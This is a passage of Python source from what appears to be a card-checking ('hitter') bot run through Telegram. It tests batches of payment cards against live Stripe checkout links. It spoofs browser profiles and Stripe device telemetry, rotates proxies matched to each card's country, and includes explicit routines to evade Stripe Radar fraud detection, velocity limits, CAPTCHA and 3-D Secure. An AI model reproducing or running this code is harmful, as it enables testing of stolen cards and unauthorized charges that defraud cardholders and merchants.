            _tel_src = "js-tokenize-inner-v3" if (is_pi or is_seti) else "checkout-inner-live-v3"
            payload = {
                "v": 2,
                "tag": "5.6.8_js_fp",
                "src": _tel_src,
                "a": {
                    "a": self.pk_live,
                    "b": landing_url,
                    "c": int(profile.get('color_depth', '24')),
                    "d": f"{profile.get('screen_width', '1920')}x{profile.get('screen_height', '1080')}",
                    "e": False,
                    "f": locale,
                    "g": profile.get('platform', 'Win32'),
                    "h": profile['user_agent'],
                    "i": tz_offset,
                    "j": False,
                    "k": 8,
                    "l": 8,
                    "m": "",
                    "n": "",
                    "o": ""
                }
            }
            loop = asyncio.get_event_loop()
            tel_headers = {
                "content-type": "application/json",
                "accept": "application/json",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
                "user-agent": profile['user_agent']
            }
            if "sec-ch-ua" in profile:
                tel_headers["sec-ch-ua"] = profile["sec-ch-ua"]
            if "sec-ch-ua-mobile" in profile:
                tel_headers["sec-ch-ua-mobile"] = profile["sec-ch-ua-mobile"]
            if "sec-ch-ua-platform" in profile:
                tel_headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]

            # Use the shared session if provided so m.stripe.com/6 shares the cookie jar
            # with the checkout page warmup (same stripe_mid cookie = legitimate session continuity)
            if session is not None:
                tel_res = await loop.run_in_executor(None, lambda: session.post(
                    "https://m.stripe.com/6",
                    headers=tel_headers,
                    json=payload, timeout=10))
            else:
                tel_res = await loop.run_in_executor(None, lambda: cffi_requests.post(
                    "https://m.stripe.com/6",
                    headers=tel_headers,
                    json=payload, proxies=proxies, timeout=10, impersonate=profile["impersonate"]))
            if tel_res.status_code == 200:
                t = tel_res.json()
                return {'muid': t.get('muid') or fallback['muid'], 'sid': t.get('sid') or fallback['sid'], 'guid': t.get('guid') or fallback['guid']}
        except Exception:
            pass
        return fallback

    async def fetch_receipt_url(self, intent_id: str, client_secret: str, headers: dict, proxies: dict, profile: dict) -> Optional[str]:
        if not intent_id or not client_secret:
            return None
        if intent_id.startswith('seti_'):
            return None
            
        loop = asyncio.get_event_loop()
        url = f"https://api.stripe.com/v1/payment_intents/{intent_id}?is_stripe_sdk=false&client_secret={client_secret}&key={self.pk_live}"
        get_headers = {
            "accept": "application/json",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": headers.get("user-agent", "")
        }
        
        for attempt in range(3):
            try:
                res = await loop.run_in_executor(None, lambda: cffi_requests.get(url, headers=get_headers, proxies=proxies, timeout=10, impersonate=profile["impersonate"]))
                if res.status_code == 200:
                    res_json = res.json()
                    receipt_url = find_receipt_url(res_json)
                    if receipt_url:
                        return receipt_url
            except Exception as e:
                print(f"DEBUG: fetch_receipt_url attempt {attempt+1} failed: {e}")
            await asyncio.sleep(0.5)
        return None

    async def hit(self, card: Dict, attempt: int, user_id: int, cached_stripe_tokens: dict = None) -> Dict:
        start = time.time()
        result = {'attempt': attempt, 'card': card, 'success': False, 'decline_code': None, 'response_time': 0, 'amount': None, 'merchant': None, 'proxy_raw': None, 'error': None}
        
        BROWSER_PROFILES = [
            {
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "impersonate": "chrome124",
                "platform": "Win32",
                "color_depth": "32",
                "screen_height": "1080",
                "screen_width": "1920",
                "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"'
            },
            {
                "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "impersonate": "chrome124",
                "platform": "MacIntel",
                "color_depth": "30",
                "screen_height": "1050",
                "screen_width": "1680",
                "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"macOS"'
            },
            {
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "impersonate": "chrome120",
                "platform": "Win32",
                "color_depth": "24",
                "screen_height": "1440",
                "screen_width": "2560",
                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"'
            },
        ]
        profile = random.choice(BROWSER_PROFILES)
        
        # BIN Intelligence — identify card country/bank before hitting
        bin_info = await BINLookup.lookup(card['card'])
        bin_country = bin_info.get('country', '')
        
        max_retries = 3
        for current_attempt in range(max_retries):
            try:
                # Acquire loop once per attempt — prevents broken ordering from re-acquiring mid-flow
                loop = asyncio.get_event_loop()

                if current_attempt == 0:
                    proxy_data = self.proxy_data
                else:
                    proxy_data = await ProxyManager.get_geo_matched(user_id, bin_country) if bin_country else await ProxyManager.get_random(user_id)
                proxies = None
                if proxy_data:
                    result['proxy_raw'] = proxy_data['raw']
                    auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
                    proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
                    proxies = {"http": proxy_url, "https": proxy_url}

                is_pi = isinstance(self.cs_live, str) and self.cs_live.startswith('pi_')
                is_seti = isinstance(self.cs_live, str) and self.cs_live.startswith('seti_')
                origin_url = "https://invoice.stripe.com" if (is_pi or is_seti) else "https://checkout.stripe.com"
                checkout_page_url = f"https://checkout.stripe.com/c/pay/{self.cs_live}"

                headers = {
                    "authority": "api.stripe.com",
                    "accept": "application/json",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": origin_url,
                    "referer": checkout_page_url,
                    "user-agent": profile["user_agent"]
                }
                if "sec-ch-ua" in profile: headers["sec-ch-ua"] = profile["sec-ch-ua"]
                if "sec-ch-ua-mobile" in profile: headers["sec-ch-ua-mobile"] = profile["sec-ch-ua-mobile"]
                if "sec-ch-ua-platform" in profile: headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]

                address, tz_id, locale = await RandomData.get_address_and_timezone(proxy_url if proxies else None)
                
                # Cache proxy geo for future BIN-to-proxy matching
                if proxy_data and address.get('country'):
                    ProxyManager._geo_cache[proxy_data.get('server', '')] = address['country']
                
                # Step 0: Create browser session with persistent cookie jar
                _cffi_session = cffi_requests.Session(impersonate=profile["impersonate"])
                if proxies:
                    _cffi_session.proxies = proxies

                # Step 0.1: Browser Session Warm-Up
                # Get the initial checkout page to populate cookie jar with __stripe_mid and other cookies.
                # All subsequent requests (telemetry, pre-flights, tokenization) must flow through this same session.
                rqdata_token = None
                try:
                    warmup_headers = {
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "accept-language": "en-US,en;q=0.9",
                        "accept-encoding": "gzip, deflate, br",
                        "sec-fetch-dest": "document",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-site": "none",
                        "sec-fetch-user": "?1",
                        "upgrade-insecure-requests": "1",
                        "user-agent": profile["user_agent"],
                        "cache-control": "max-age=0"
                    }
                    if "sec-ch-ua" in profile: warmup_headers["sec-ch-ua"] = profile["sec-ch-ua"]
                    if "sec-ch-ua-mobile" in profile: warmup_headers["sec-ch-ua-mobile"] = profile["sec-ch-ua-mobile"]
                    if "sec-ch-ua-platform" in profile: warmup_headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]

                    warmup_res = await loop.run_in_executor(None, lambda: _cffi_session.get(
                        checkout_page_url, headers=warmup_headers, timeout=15))
                except Exception:
                    pass  # warmup failure is non-fatal — continue

                # Stripe device fingerprint tokens (muid/sid/guid)
                # Reuse cached session tokens if available — mimics __stripe_mid (1yr) + __stripe_sid (30min)
                # A fresh token per card is a blatant bot signal to Stripe Radar
                if cached_stripe_tokens and cached_stripe_tokens.get('muid'):
                    stripe_tokens = cached_stripe_tokens
                else:
                    # First card in session — generate tokens through shared session (cookie continuity)
                    stripe_tokens = await self.generate_stripe_telemetry(profile, proxies, address, page_url=checkout_page_url, session=_cffi_session)
                    # Return freshly generated tokens so the session-level cache can store them
                    result['_stripe_tokens'] = stripe_tokens

                # Step 0.3: Radar Device Data Beacon (r.stripe.com/0)
                # Real Stripe.js fires this immediately after m.stripe.com/6 telemetry.
                # Without it, Radar sees an incomplete device fingerprint session = bot signal.
                try:
                    _radar_payload = json.dumps({
                        "v": "2",
                        "id": stripe_tokens.get('muid', ''),
                        "k": self.pk_live,
                        "t": "muid",
                        "src": "js"
                    })
                    _radar_headers = {
                        "content-type": "application/json",
                        "origin": "https://js.stripe.com",
                        "referer": "https://js.stripe.com/",
                        "user-agent": profile['user_agent']
                    }
                    await loop.run_in_executor(None, lambda: _cffi_session.post(
                        "https://r.stripe.com/0",
                        headers=_radar_headers,
                        data=_radar_payload, timeout=5))
                except Exception:
                    pass  # non-fatal — continue even if beacon fails
    
                # Generate perfectly formatted Idempotency Keys to bypass velocity blocks
                import uuid
                pm_idempotency = str(uuid.uuid4())
                confirm_idempotency = str(uuid.uuid4())
                
                # Build dynamic typing/fill duration simulator (time_on_page) to act human
                timing_ms = random.randint(9000, 24000)

                # Scrape real Stripe.js build hash from live CDN — fabricated hashes are instant bot flags
                _js_hash = await loop.run_in_executor(None, StripeAPIHitter._fetch_live_stripe_js_hash)
                _payment_user_agent = f"stripe.js/{_js_hash}; stripe-js-v3/{_js_hash}; checkout"
                
                # Step 1: Tokenize the raw card into a PaymentMethod
                pm_url = "https://api.stripe.com/v1/payment_methods"
                pm_data = {
                    "type": "card",
                    "card[number]": card['card'],
                    "card[cvc]": card['cvv'],
                    "card[exp_month]": card['month'],
                    "card[exp_year]": card['year'],
                    "billing_details[name]": RandomData.get_name(),
                    "billing_details[email]": self.locked_email if self.locked_email else RandomData.get_email(),
                    "billing_details[address][line1]": address["line1"],
                    "billing_details[address][city]": address["city"],
                    "billing_details[address][state]": address["state"],
                    "billing_details[address][postal_code]": address["zip"],
                    "billing_details[address][country]": address["country"],
                    # Use rotated Stripe.js hash — stale static hashes get flagged by Radar
                    "payment_user_agent": _payment_user_agent,
                    "time_on_page": str(timing_ms),
                    "guid": stripe_tokens['guid'],
                    "muid": stripe_tokens['muid'],
                    "sid": stripe_tokens['sid'],
                    "key": self.pk_live,
                }
                # Step 1.5: Algorithm 4 - Stripe Link Enrollment Bypass
                # [DISABLED] Initiating unverified Link sessions often triggers `rqdata` (hCaptcha) 
                # bot protection on strict merchants like Foyer Tech. It's safer to skip it.
                # link_url = "https://api.stripe.com/v1/link_account_sessions"
                # link_data = {
                #     "email": pm_data["billing_details[email]"],
                #     "key": self.pk_live,
                #     "payment_method_data[type]": "card"
                # }
                # if self.cs_live:
                #     link_data["payment_pages_checkout_session"] = self.cs_live
                #     
                # link_headers = headers.copy()
                # link_res = await loop.run_in_executor(None, lambda: cffi_requests.post(link_url, headers=link_headers, data=link_data, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                # if link_res.status_code == 200:
                #     link_json = link_res.json()
                #     if link_json.get("client_secret"):
                #         # Inject the unverified Link session into the PaymentMethod payload
                #         pm_data["link[credentials][client_secret]"] = link_json["client_secret"]

                # Step 0.5: Elements Session Pre-flight Bootstrap (Mimic Browser UI setup)
                # Helps Radar engine associate the checkout token with elements-session state.
                # Uses persistent _cffi_session so cookies from warmup are forwarded.
                # Stripe-Version header is required — real Stripe.js always sends it; missing it flags non-browser.
                try:
                    elements_url = f"https://api.stripe.com/v1/elements/sessions?key={self.pk_live}&locale={locale}&type=payment&payment_pages_checkout_session={self.cs_live}"
                    el_headers = headers.copy()
                    el_headers["referer"] = checkout_page_url
                    el_headers["accept-language"] = "en-US,en;q=0.9"
                    el_headers["Stripe-Version"] = "2026-04-22.dahlia"
                    el_headers["sec-fetch-site"] = "cross-site"
                    el_headers["sec-fetch-mode"] = "cors"
                    el_headers["sec-fetch-dest"] = "empty"
                    await loop.run_in_executor(None, lambda: _cffi_session.get(
                        elements_url, headers=el_headers, timeout=10))
                except Exception:
                    pass


                pm_headers = headers.copy()
                pm_headers["Idempotency-Key"] = pm_idempotency
                pm_headers["accept-language"] = "en-US,en;q=0.9"
                pm_headers["sec-fetch-site"] = "cross-site"
                pm_headers["sec-fetch-mode"] = "cors"
                pm_headers["sec-fetch-dest"] = "empty"
                pm_headers["referer"] = checkout_page_url
                # Use persistent session — stripe_mid cookies from warmup flow into tokenization
                pm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(pm_url, headers=pm_headers, data=pm_data, timeout=30))
                pm_json = pm_res.json()

                
                if 'id' not in pm_json:
                    err = pm_json.get('error', {})
                    result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'pm_token_failed')
                    result['error'] = err.get('message', 'Failed to generate payment method token')
                    # If we reach here without exception, do not retry!
                    return result
                    
                pm_id = pm_json['id']
                
                # Step 2: Confirm the charge using the trusted pm_ token
                if is_pi:
                    pi_id = self.cs_live.split('_secret_')[0]
                    confirm_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
                    confirm_data = {
                        "payment_method": pm_id,
                        "expected_payment_method_type": "card",
                        "key": self.pk_live,
                        "client_secret": self.cs_live
                    }
                    # Add Low-Value SCA Exemption Hint if transaction size warrants it ($30/€30 equivalent)
                    if self.raw_amount is not None and 0 < self.raw_amount < 3000:
                        confirm_data["payment_method_options[card][mit_exemption][reason]"] = "low_value"
                    
                    if self.raw_amount is None or self.raw_amount == 0:
                        confirm_data["save_payment_method"] = "true"
                        confirm_data["allow_redisplay"] = "always"

                    if self.raw_amount is not None and self.raw_amount > 0:
                        confirm_data["expected_amount"] = self.raw_amount
                elif is_seti:
                    seti_id = self.cs_live.split('_secret_')[0]
                    confirm_url = f"https://api.stripe.com/v1/setup_intents/{seti_id}/confirm"
                    confirm_data = {
                        "payment_method": pm_id,
                        "expected_payment_method_type": "card",
                        "key": self.pk_live,
                        "client_secret": self.cs_live
                    }
                    if self.raw_amount is None or self.raw_amount == 0:
                        confirm_data["save_payment_method"] = "true"
                        confirm_data["allow_redisplay"] = "always"
                else:
                    confirm_url = f"https://api.stripe.com/v1/payment_pages/{self.cs_live}/confirm"
                    confirm_data = {
                        "payment_method": pm_id,
                        "expected_payment_method_type": "card",
                        "consent[terms_of_service]": "accepted",
                        "key": self.pk_live,
                    }
                    if self.raw_amount is not None and self.raw_amount > 0:
                        confirm_data["expected_amount"] = self.raw_amount
                
                confirm_headers = headers.copy()
                confirm_headers["Idempotency-Key"] = confirm_idempotency
                # Real browsers always send sec-fetch headers on XHR/fetch calls from a loaded page
                confirm_headers["accept-language"] = "en-US,en;q=0.9"
                confirm_headers["sec-fetch-site"] = "cross-site"
                confirm_headers["sec-fetch-mode"] = "cors"
                confirm_headers["sec-fetch-dest"] = "empty"
                confirm_headers["referer"] = checkout_page_url
                # Use persistent session — cookies from warmup + elements session propagate to confirm
                confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
                confirm_json = confirm_res.json()
                
                # Dynamic Amount Mismatch Bypass
                # If the scraped amount was slightly off (taxes/shipping) and caused a mismatch, instantly retry without the constraint
                err_code = confirm_json.get('error', {}).get('code')
                err_msg = confirm_json.get('error', {}).get('message', '') or ''
                
                # Parameter Unknown Bypass — iteratively strip any rejected parameter and retry
                # Stripe will name the offending param in the error message, so we parse and remove it.
                _param_retry_limit = 4
                _param_retries = 0
                while confirm_res.status_code == 400 and err_code == 'parameter_unknown' and _param_retries < _param_retry_limit:
                    # Extract the offending parameter name from the error message
                    # e.g. "Received unknown parameter: allow_redisplay" or "... payment_method_options[card][request_three_d_secure]"
                    import re as _re2
                    _param_match = _re2.search(r'unknown parameter[:\s]+([^\s\.\,]+)', err_msg, _re2.IGNORECASE)
                    _stripped = False
                    if _param_match:
                        _bad_param = _param_match.group(1).strip("'\"")
                        # Find and remove any key in confirm_data that contains the offending param segment
                        _keys_to_del = [k for k in list(confirm_data.keys()) if _bad_param in k]
                        for _k in _keys_to_del:
                            del confirm_data[_k]
                            _stripped = True
                    else:
                        # Fallback: strip known optional params one by one
                        for _fallback_param in ['allow_redisplay', 'save_payment_method', 'payment_method_options[card][request_three_d_secure]', 'payment_method_options[card][mit_exemption][reason]']:
                            if _fallback_param in confirm_data:
                                del confirm_data[_fallback_param]
                                _stripped = True
                                break
                    if not _stripped:
                        break
                    confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
                    confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
                    confirm_json = confirm_res.json()
                    err_code = confirm_json.get('error', {}).get('code')
                    err_msg = confirm_json.get('error', {}).get('message', '') or ''
                    _param_retries += 1

                
                # Unified Amount Mismatch Bypass
                # Check response.status_code != 200 OR check if error payload returned in response json dict
                has_amount_mismatch = False
                if confirm_res.status_code != 200 and (err_code == 'checkout_amount_mismatch' or 'expected amount' in err_msg.lower() or 'expected_amount' in err_msg):
                    has_amount_mismatch = True
                elif confirm_res.status_code == 200:
                    temp_err = confirm_json.get('error', {})
                    if temp_err:
                        temp_code = temp_err.get('code')
                        temp_msg = temp_err.get('message', '') or ''
                        if temp_code == 'checkout_amount_mismatch' or 'expected amount' in temp_msg.lower() or 'computed invoice' in temp_msg.lower() or 'expected_amount' in temp_msg:
                            has_amount_mismatch = True
                            err_code = temp_code
                            err_msg = temp_msg

                if has_amount_mismatch:
                    # Stripe's error message usually contains the correct expected amount: 
                    # e.g., "The expected amount (2000) does not match the actual amount (0)."
                    import re
                    match = re.search(r'actual amount \((\d+)\)', err_msg.lower())
                    if match:
                        confirm_data['expected_amount'] = int(match.group(1))
                    elif 'subscription' in err_msg.lower() or 'computed invoice' in err_msg.lower() or 'latest invoice' in err_msg.lower():
                        # For subscription checkouts, delete expected_amount to let Stripe confirm the computed invoice automatically
                        if 'expected_amount' in confirm_data:
                            del confirm_data['expected_amount']
                    else:
                        # Fallback to 0 for SetupIntents / Free Trials if regex fails
                        confirm_data['expected_amount'] = 0
                        
                    confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
                    confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
                    confirm_json = confirm_res.json()
                
                result['response_time'] = time.time() - start
                
                if confirm_res.status_code == 200 and 'error' not in confirm_json:
                    pi = confirm_json.get('payment_intent', {})
                    si = confirm_json.get('setup_intent', {})
                    intent_id = pi.get('id') if isinstance(pi, dict) and pi.get('id') else (si.get('id') if isinstance(si, dict) else None)
                    client_secret = pi.get('client_secret') if isinstance(pi, dict) and pi.get('client_secret') else (si.get('client_secret') if isinstance(si, dict) else None)
                    if not intent_id or not client_secret:
                        fallback_id, fallback_secret = extract_intent_details(confirm_json)
                        intent_id = intent_id or fallback_id
                        client_secret = client_secret or fallback_secret
                    is_setup_intent = bool(si) or (isinstance(intent_id, str) and 'seti' in intent_id)
                    
                    if isinstance(pi, dict) and pi.get('last_payment_error'):
                        err = pi.get('last_payment_error')
                        result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
                        result['error'] = err.get('message', 'Unknown error')
                        return result
                        
                    if isinstance(si, dict) and si.get('last_setup_error'):
                        err = si.get('last_setup_error')
                        result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
                        result['error'] = err.get('message', 'Unknown error')
                        return result
    
                    status = confirm_json.get('status')
                    next_action = confirm_json.get('next_action', {})
                    if isinstance(pi, dict):
                        if pi.get('status'): status = pi.get('status')
                        if pi.get('next_action'): next_action = pi.get('next_action')
                    elif isinstance(si, dict):
                        if si.get('status'): status = si.get('status')
                        if si.get('next_action'): next_action = si.get('next_action')
                        
                    if status in ['succeeded', 'requires_capture', 'complete']:
                        result['success'] = True
                        receipt_url = find_receipt_url(confirm_json)
                        if not receipt_url and intent_id and client_secret:
                            receipt_url = await self.fetch_receipt_url(intent_id, client_secret, headers, proxies, profile)
                        if receipt_url:
                            result['receipt_url'] = receipt_url
                        return result
                    elif status in ['requires_action', 'requires_source_action']:
                        try:
                            state = None
                            captcha_triggered = False
                            res = confirm_json.get('payment_intent') or confirm_json.get('setup_intent') or confirm_json
                            pk = self.pk_live
                            pi = intent_id
                            taken = time.time() - start
                            
                            session = requests.Session()
                            if proxies:
                                session.proxies = proxies

                            if res.get("status") in ["requires_action", "requires_source_action"]:
                                next_action = res.get("next_action", {})
                                sdk = next_action.get("use_stripe_sdk", {})
                                captcha_triggered = False
                                if isinstance(sdk.get('stripe_js'), dict) and 'rqdata' in sdk.get('stripe_js', {}):
                                    captcha_triggered = True
                                    # Don't bail — extract source from rqdata dict if present
                                    rq_dict = sdk.get('stripe_js', {})
                                    rq_source = rq_dict.get('source') or rq_dict.get('three_d_secure_2_source')
                                    if rq_source:
                                        sdk['_rq_source_override'] = rq_source

                                source = (
                                    sdk.get("three_d_secure_2_source")
                                    or sdk.get("source")
                                    or sdk.get("_rq_source_override")
                                    or next_action.get("source")
                                )

                                # If CAPTCHA triggered and no source found, re-confirm with fresh 3DS path
                                if captcha_triggered and not source:
                                    try:
                                        if is_pi or is_seti:
                                            reconfirm_data = {
                                                "payment_method": pm_id,
                                                "expected_payment_method_type": "card",
                                                "key": self.pk_live,
                                                "client_secret": self.cs_live
                                            }
                                        else:
                                            reconfirm_data = {
                                                "payment_method": pm_id,
                                                "expected_payment_method_type": "card",
                                                "payment_method_options[card][request_three_d_secure]": "any",
                                                "consent[terms_of_service]": "accepted",
                                                "key": self.pk_live,
                                            }
                                        if self.raw_amount is not None and self.raw_amount > 0:
                                            reconfirm_data["expected_amount"] = self.raw_amount
                                        import uuid as _uuid
                                        reconfirm_headers = headers.copy()
                                        reconfirm_headers["Idempotency-Key"] = str(_uuid.uuid4())
                                        await asyncio.sleep(1)
                                        reconfirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(
                                            confirm_url, headers=reconfirm_headers, data=reconfirm_data,
                                            proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
                                        reconfirm_json = reconfirm_res.json()
                                        rc_pi = reconfirm_json.get('payment_intent') or reconfirm_json.get('setup_intent') or reconfirm_json
                                        rc_status = rc_pi.get('status') if isinstance(rc_pi, dict) else None
                                        if rc_status in ['succeeded', 'requires_capture', 'complete']:
                                            result['success'] = True
                                            receipt_url = find_receipt_url(reconfirm_json)
                                            if receipt_url:
                                                result['receipt_url'] = receipt_url
                                            return result
                                        elif rc_status in ['requires_action', 'requires_source_action']:
                                            rc_sdk = (rc_pi.get('next_action', {}) or {}).get('use_stripe_sdk', {}) or {}
                                            source = (
                                                rc_sdk.get("three_d_secure_2_source")
                                                or rc_sdk.get("source")
                                                or (rc_pi.get('next_action', {}) or {}).get("source")
                                            )
                                            # Update intent for downstream polling
                                            if isinstance(rc_pi, dict) and rc_pi.get('id'):
                                                pi = rc_pi.get('id')
                                                intent_id = pi
                                                client_secret = rc_pi.get('client_secret') or client_secret
                                                res = rc_pi
                                                next_action = rc_pi.get('next_action', {}) or {}
                                                sdk = next_action.get('use_stripe_sdk', {}) or {}
                                    except Exception:
                                        pass
                                state = None

                                is_legacy_3ds = (
                                    res.get("status") == "requires_source_action"
                                    or sdk.get("type") == "three_d_secure_redirect"
                                    or (isinstance(source, str) and source.startswith("src_"))
                                )
                                if is_legacy_3ds:
                                    redirect_url = sdk.get("stripe_js") or next_action.get("redirect_to_url", {}).get("url")
                                    if isinstance(redirect_url, str):
                                        redir_headers = {
                                            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                                            "user-agent": profile["user_agent"]
                                        }
                                        await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=redir_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                    state = "redirected"
                                elif source:
                                    # authenticate is an SDK-facing endpoint — use Android UA (mobile SDK path)
                                    _auth_ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
                                    auth_headers = {
                                        "accept": "application/json",
                                        "content-type": "application/x-www-form-urlencoded",
                                        "origin": "https://js.stripe.com",
                                        "referer": "https://js.stripe.com/",
                                        "user-agent": _auth_ua
                                    }
                                    browser = {
                                        "fingerprintAttempted": True,
                                        "fingerprintData": None,
                                        "challengeWindowSize": None,
                                        "threeDSCompInd": "Y",
                                        "browserJavaEnabled": False,
                                        "browserJavascriptEnabled": True,
                                        "browserLanguage": "en-US",
                                        "browserColorDepth": "24",
                                        "browserScreenHeight": "873",
                                        "browserScreenWidth": "393",
                                        "browserTZ": "-300",
                                        "browserUserAgent": auth_headers["user-agent"]
                                    }
                                    auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
                                    auth_data = {
                                        "source": source,
                                        "browser": json.dumps(browser),
                                        "one_click_authn_device_support[hosted]": "false",
                                        "one_click_authn_device_support[same_origin_frame]": "false",
                                        "one_click_authn_device_support[spc_eligible]": "false",
                                        "one_click_authn_device_support[webauthn_eligible]": "false",
                                        "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
                                        "key": pk
                                    }
                                    auth_resp_raw = await loop.run_in_executor(None, lambda: cffi_requests.post(
                                        auth_url, headers=auth_headers, data=auth_data,
                                        proxies=proxies, timeout=30, impersonate="chrome120"))
                                    auth_json = {}
                                    try:
                                        auth_json = auth_resp_raw.json()
                                        state = auth_json.get("state")
                                    except Exception:
                                        state = "3DS Attempt failed"

                                    if state == "challenge_required":
                                        result['decline_code'] = 'challenge_required'
                                        result['error'] = 'challenge_required'
                                        return result

                                    is_setup = is_setup_intent or (isinstance(pi, str) and 'seti' in pi)
                                    intent_endpoint = "setup_intents" if is_setup else "payment_intents"
                                    poll_url = f"https://api.stripe.com/v1/{intent_endpoint}/{pi}?is_stripe_sdk=false&client_secret={client_secret}&key={pk}"
                                    poll_headers = {
                                        "accept": "application/json",
                                        "origin": "https://js.stripe.com",
                                        "referer": "https://js.stripe.com/"
                                    }
                                    poll_resp_raw = await loop.run_in_executor(None, lambda: cffi_requests.get(
                                        poll_url, headers=poll_headers, proxies=proxies,
                                        timeout=30, impersonate=profile["impersonate"]))
                                    poll_json = poll_resp_raw.json()
                                    status_2 = poll_json.get('status')
                                    
                                    if status_2 in ['succeeded', 'requires_capture', 'complete']:
                                        result['success'] = True
                                        receipt_url = find_receipt_url(poll_json)
                                        if not receipt_url and pi and client_secret:
                                            receipt_url = await self.fetch_receipt_url(pi, client_secret, headers, proxies, profile)
                                        if receipt_url:
                                            result['receipt_url'] = receipt_url
                                        return result

                                    err = poll_json.get('last_payment_error') or poll_json.get('error') or {}
                                    if isinstance(err, dict) and err.get('message'):
                                        result['decline_code'] = err.get('decline_code', err.get('code', status_2))
                                        result['error'] = err.get('message', 'Unknown error')
                                    elif captcha_triggered:
                                        result['decline_code'] = 'stripe_captcha_bypass_failed'
                                        try:
                                            _raw_dump = json.dumps(confirm_json, indent=None, default=str)
                                        except Exception:
                                            _raw_dump = str(confirm_json)
                                        result['error'] = f'rqdata_captcha | raw: {_raw_dump}'
                                    else:
                                        result['decline_code'] = status_2 or '3ds_unknown'
                                        result['error'] = f"3ds_challenge_unresolved"
                                    return result
                        except Exception as ex:
                            print(f"DEBUG: 3DS bypass failed: {ex}")
                            result['decline_code'] = f'3d_secure_exception_{str(ex)[:30]}'
                            return result
                    elif status == 'requires_payment_method':
                        result['decline_code'] = 'generic_decline'
                        result['error'] = 'requires_payment_method'
                    elif status == 'open':
                        err = confirm_json.get('error')
                        if isinstance(err, dict):
                            result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
                            result['error'] = err.get('message', 'Unknown error')
                            return result
                        
                        result['decline_code'] = 'open'
                        result['error'] = str(confirm_json)[:500]  # Dump the JSON to telegram so we can see what's actually there
                    else:
                        result['decline_code'] = status
                else:
                    err = confirm_json.get('error', {})
                    result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'unknown')
                    result['error'] = err.get('message', 'Unknown error')
                    
                # If we reach here without exception, do not retry!
                return result
                    
            except Exception as e:
                if current_attempt < max_retries - 1:
                    await asyncio.sleep(2)
                    continue
                result['error'] = str(e)
                result['decline_code'] = 'exception'
                result['response_time'] = time.time() - start
                return result
                
        return result

class ConcurrentHitter:
    # Reusable link domains — each visit mints a fresh cs_live checkout session
    REUSABLE_DOMAINS = ['billing.stripe.com', 'buy.stripe.com', 'invoice.stripe.com']
    
    def __init__(self, user_id: int, url: str, cards: list, update_callback=None):
        self.user_id = user_id
        self.url = url
        self.cards = cards
        self.successes = 0
        self.fails = 0
        self.completed = 0
        self.total = len(cards[:MAX_ATTEMPTS])
        self.url_info = None
        self.update_callback = update_callback
        self.is_running = True
        self._reusable = any(d in self.url.lower() for d in self.REUSABLE_DOMAINS)
        self._session_lock = asyncio.Lock()  # serialize session fetches to avoid thundering herd
        # Cached stripe device tokens — mimic __stripe_mid (1yr) and __stripe_sid (30min) persistence
        # All cards in the same session share the same muid/sid/guid, just like a real browser
        self._stripe_tokens: dict = {}
        self._stripe_tokens_ts: float = 0.0
        
    async def _fetch_fresh_session(self) -> dict:
        """Re-fetch the reusable URL to mint a fresh cs_live + pk_live pair.
        Returns dict with cs_token, pk_key or None on failure."""
        if 'invoice.stripe.com' in self.url.lower():
            res = await StripeAPIExtractor.fetch_invoice_data(self.user_id, self.url)
            if res.get('success'):
                return {'cs_token': res['cs_token'], 'pk_key': res['pk_key']}
            return None

        for _ in range(3):
            try:
